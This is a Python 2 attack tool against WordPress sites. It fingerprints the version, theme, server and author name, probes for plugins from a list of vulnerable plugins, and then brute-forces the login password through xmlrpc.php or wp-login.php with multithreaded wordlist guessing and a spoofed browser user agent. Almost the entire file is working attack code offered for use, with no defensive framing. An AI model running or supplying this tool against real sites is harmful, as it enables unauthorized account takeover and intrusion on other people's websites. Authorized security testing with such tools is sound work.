from __future__ import division
import requests
import re
import threading
from Queue import Queue
from multiprocessing.sharedctypes import Value
import time 
import os
import sys
from __init__ import *
from logging import warning
import cookielib
import urllib
import urllib2


class WordPress_Scan():
	def __init__(self,dict):
		TempUrl = dict['url']
		self.url =  "http://{0}".format(TempUrl)
		self.username = dict['uname']
		self.pwdfile = dict['pwd']
		self.Mixthread = dict['bthreads']
		self.Pthread = dict['pthreads']
		self.user_agent = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)'
		referer=self.url+"/wp-login.php"
		cooker="wordpress_test_cookie=WP+Cookie+check"
		self.Bheader= {'User-Agent': self.user_agent,"Cookie":cooker,"Referer":referer,"Host":TempUrl}
		self.cookie = cookielib.CookieJar()
		self.open = urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cookie))

	def Connect_Test(self): 
		try:
			requests.get(self.url,timeout = 10)
		except:
			print "[*] Connect Fail!"
			exit()

	def VersionScan(self):
		self.Version_Path =  self.url+'/readme.html'
		self.Version_Page = requests.get(self.Version_Path)
		self.Version_Page.encoding='utf-8'
		if(self.Version_Page.status_code == 200):
			self.Version_text = self.Version_Page.text
			self.reg = r'<br />(.+?)\n</h1>'
			self.RegEx = re.compile(self.reg,re.S)
			self.Version = re.findall(self.RegEx,self.Version_text)
			if(len(self.Version)>0):
				print "[+] Wordpress Version:\33[31m%s\33[0m" %self.Version[0].encode("utf-8")

	def ThemesScan(self):
		ThemesPath = self.url
		self.URL_Page = requests.get(ThemesPath)
		if(self.URL_Page.status_code == 200):
			URL_Page_text = self.URL_Page.text
			reg = r'/wp-content/themes/(.*?)/'
			RegEx = re.compile(reg)
			themes = re.findall(RegEx,URL_Page_text)
			if(len(themes)>0):
				print "[+] Wordpress Themes:\33[31m%s\33[0m" %themes[0]

	def Server_Scan(self):
		Server_Path = self.url
		self.ReServer = requests.get(Server_Path)
		if(self.ReServer.status_code == 200):
			print "[+] Wordpress Server Info:\33[31m%s\33[0m" %self.ReServer.headers['server']

	def AuthorScan(self):
		AuthorPath = self.url+'?feed=rss2'
		self.ReAuthor = requests.get(AuthorPath)
		if(self.ReAuthor.status_code == 200):
			Author_text = self.ReAuthor.text
			reg =  r'<dc:creator><!\[CDATA\[(.*?)\]\]></dc:creator>'
			RegEx = re.compile(reg)
			Author_list= re.findall(reg,Author_text)
			if(len(Author_list)>0):
				print "[+] Wordpress Author maybe:\33[31m%s\33[0m" %Author_list[0]
				self.Author = Author_list[0]

	def LoadPlugin(self):
		self.mutex = threading.Lock()
		print "[*] \33[33mStart Plugin scan,please wait...\33[0m"
		self.TestNum = 0;
		PluginThread=[]
		ExistList = []
		self.flag = 0
		self.PluginQueue = Queue(maxsize = 10000)
		linecount = len(open('./dict/loopholes_plugin.txt','rU').readlines())
		Plugin_Path =  "http://{0}".format(self.url)
		if(os.path.exists(r'./dict/loopholes_plugin.txt')):
			file = open(r'./dict/loopholes_plugin.txt','r')
			for line in file:
				PluginList = line.strip()
				self.PluginQueue.put(PluginList)
			file.close()
			#self.PluginQueue.cancel_join_thread() 
		else:
			print "[*] file does not exist!"
		start = time.time()
		for count in range(self.Pthread):
			t = threading.Thread(target = self.PluginScan,args = (linecount,ExistList))
			t.setDaemon(True)
			t.start()
			PluginThread.append(t)
		for i in PluginThread:
			i.join()
		print ""
		for j in ExistList:
			print "[+] \33[31m%s\33[0m" %j
		end = time.time()
		#print "Plugin_Scan_Time: %f s" % (end - start)
		
	def PluginScan(self,linecount,ExistList):
		thread = threading.current_thread()
		while not self.PluginQueue.empty():
			Plugin_Path =  self.url
			try:
				PluginDir = self.PluginQueue.get(timeout = 1)
				self.mutex.acquire()
				self.TestNum+=1
				self.mutex.release()
			except:
				#warning(ex)
				pass				
			Plugin_Path = "%s/wp-content/plugins/%s/" %(Plugin_Path,PluginDir)
			try:
				Plugin_re = requests.get(Plugin_Path,headers = HEADERS)
			except:
				self.PluginQueue.put(PluginDir)
				print '[*] Connect timeout !!'
				continue
			if(Plugin_re.status_code == 200 or Plugin_re.status_code == 403):
				ExistList.append(PluginDir)
			Plugin_Path =  self.url
			sys.stdout.write('Current full schedule:'+str(str(self.TestNum)+'/'+str(linecount))+"\r")
			sys.stdout.flush()


	def Brute_Force(self):
		self.Brute_path1 = self.url+'/wp-login.php'
		self.Brute_path2 = self.url+'/xmlrpc.php'
		self.KeyFlag = Value('b', 0)
		self.pwdnum = 0
		self.PwdQueue = Queue(maxsize = 10000)
		self.TruePwd = Queue(maxsize =10000)
		self.pwdcount = len(open(self.pwdfile,'rU').readlines())
		RePath2 = requests.post(self.Brute_path2)
		if(RePath2.status_code == 200):
			print "[*] Start Xmlrpc.php Brute Force"
			self.Xmlrpc_Load_Brute_Force()
		else:
			print "[*] \33[33mXML-RPC service has been disabled\33[0m"
			RePath1 = requests.get(self.Brute_path1)
			if(RePath1.status_code == 200):
				print "[*] Start wp-login.php Brute Force"
				self.Login_Load_Brute_Force()
			else:
				print"[*] \33[33mwp-login.php does not exist!\33[0m"
				print "[*] \33[33mStop Brute_Force!\33[0m"
		

	def  Login_Load_Brute_Force(self):
		PwdThread = []
		GetPwd = threading.Thread(target = self.LoginReadPwdFile)
		GetPwd.start()
		for i in range(self.Mixthread):
			th = threading.Thread(target = self.Login_Brute_Force)
			th.setDaemon(True)
			th.start()
			PwdThread.append(th)
		for i in PwdThread:
			i.join()
		if self.KeyFlag.value ==0:
			print ""
			print "[*] Password Not Found!!!"


	def Login_Brute_Force(self):
		while 1:
			if(self.KeyFlag.value):
				break
			if(not self.PwdQueue.empty()):
				Payload = self.PwdQueue.get(timeout = 1)
			else:
				break
			data = urllib.urlencode(Payload)
			try:
				Req = urllib2.Request(url=self.Brute_path1, data=data, headers=self.Bheader)
				Resp = urllib2.urlopen(Req)
				result = Resp.read()
			except:
				print "[*] Connect timeout reloading"
				continue
			self.pwdnum+=1
			if not re.search(r'login_error', result):
				self.KeyFlag.value = 1
				print ""
				print "[+] \33[31mPassword :%s success !\33[0m" %Payload['pwd']
				break
			sys.stdout.write('Current full schedule:'+str(str(self.pwdnum)+'/'+str(self.pwdcount))+"\r")
			sys.stdout.flush()

	def LoginReadPwdFile(self):
		redrect =  self.url+'/wp-admin/'
		if self.username == None:
			self.username = str(self.Author)
		file = open(self.pwdfile)
		for line in file:
			pwd = line.strip()
			if (pwd):
				payload = {"log":self.username,"pwd":pwd,"testcookie": "1","redirect_to":redrect}
				self.PwdQueue.put(payload)
		file.close()
		#self.PwdQueue.cancel_join_thread()

	def Xmlrpc_Load_Brute_Force(self):
		PwdThread = []
		GetPwd = threading.Thread(target = self.XmlrpcReadPwdFile)
		GetPwd.start()
		for i in range(self.Mixthread):
			th = threading.Thread(target = self.Xmlrpc_Brute_Force)
			th.setDaemon(True)
			th.start()
			PwdThread.append(th)
		for i in PwdThread:
			i.join()
		if self.KeyFlag.value ==0:
			print ""
			print "[*] Password Not Found!!!"

	def XmlrpcReadPwdFile(self):
		if self.username == None:
			self.username = self.Author
		file = open(self.pwdfile)
		for line in file:
			pwd = line.strip()
			if(pwd):
				Payload = '''
    					<?xml version="1.0" encoding="iso-8859-1"?>
    					<methodCall>
      					<methodName>wp.getUsersBlogs</methodName>
      					<params>
       					<param><value>''' + self.username + '''</value></param>
       					<param><value>''' + pwd + '''</value></param>
      					</params>
    					</methodCall>
  					'''
  				self.PwdQueue.put(Payload)
  				self.TruePwd.put(pwd)
  		file.close()
  		#self.PwdQueue.cancel_join_thread()
  		#self.TruePwd.cancel_join_thread()

  	def Xmlrpc_Brute_Force(self):
  		while 1:
  			if(self.KeyFlag.value):
				break
			if(not self.PwdQueue.empty()):
				Payload = self.PwdQueue.get(timeout = 1)
				pwd = self.TruePwd.get(timeout = 1)
			else:
				break
			try:
				Path2re = requests.post(self.Brute_path2,data = Payload,headers = HEADERS,timeout = 10)
			except:
				self.PwdQueue.put(Payload)
  				self.TruePwd.put(pwd)
				print '[*] Connect timeout! Retry-After       ' 
				continue
			self.pwdnum+=1
			msg = Path2re.text
			if '<int>405</int>' in msg:
				print "[*] \33[33mXML-RPC service has been disabled\33[0m"
				break
			elif 'isAdmin' in msg:
				self.KeyFlag.value = 1
				print ""
				print "[*] \33[31mpassword :%s success !\33[0m" %pwd
				break
			sys.stdout.write('Current full schedule:'+str(str(self.pwdnum)+'/'+str(self.pwdcount))+"\r")
			sys.stdout.flush()